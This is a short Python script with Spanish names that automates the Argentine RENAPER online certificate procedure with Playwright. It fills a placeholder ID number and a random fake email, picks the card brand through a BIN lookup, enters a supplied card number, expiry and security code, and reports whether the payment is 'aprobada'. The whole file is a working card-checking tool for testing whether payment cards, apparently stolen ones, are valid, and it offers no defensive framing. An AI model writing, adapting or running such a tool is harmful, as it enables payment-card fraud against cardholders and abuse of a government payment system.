import random
import string
import aiohttp
from playwright.async_api import async_playwright

async def obtener_bin_data(binlargo):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.paypertic.com/binservice/{binlargo[:6]}") as response:
            return await response.text()

async def completar_formulario(binlargo, mes, anio, code):
    async with async_playwright() as p:
        try:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            await page.goto("https://tramites.renaper.gob.ar/v2/MACRO_genera.php?tipo_tramite=CERTSOLTERIA")
            
            email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}@{''.join(random.choices(string.ascii_lowercase, k=5))}.com"
            
            await page.fill("#dni", "44444444")
            await page.select_option("#sexo", "F")
            await page.fill("#email", email)
            await page.click("button:has-text('Continuar')")
            await page.wait_for_timeout(2000)
            await page.click("a:has-text('CONTINUAR')")
            await page.wait_for_timeout(2000)
            await page.click("input#MainContent_btnTarjeta")
            await page.wait_for_timeout(2000)
            
            bindata = await obtener_bin_data(binlargo)
            bindata = bindata.lower()
            
            if "visa" in bindata and "credit" in bindata:
                await page.select_option("#ddlTarjeta", "1")
            elif "visa" in bindata and "debit" in bindata:
                await page.select_option("#ddlTarjeta", "31")
            elif "mastercard" in bindata and "debit" in bindata:
                await page.select_option("#ddlTarjeta", "105")
            elif "mastercard" in bindata and "credit" in bindata:
                await page.select_option("#ddlTarjeta", "104")
            elif "american express" in bindata:
                await page.select_option("#ddlTarjeta", "111")
            elif "cabal" in bindata:
                await page.select_option("#ddlTarjeta", "63")
            
            await page.fill("#txtCardNumber", binlargo)
            await page.fill("#txtCardExpirationMonth", mes)
            await page.fill("#txtCardExpirationYear", anio)
            await page.fill("#txtSecurityCode", code)
            await page.click("input#MainContent_btnGenerarTarjeta")
            await page.wait_for_timeout(2000)
            
            error_text = await page.text_content("body")
            if "aprobada" in error_text.lower():
                await browser.close()
                return True
            else:
                await browser.close()
                return False
        except Exception as e:
            print(f"Error al completar el formulario: {e}")
            await browser.close()
            return False
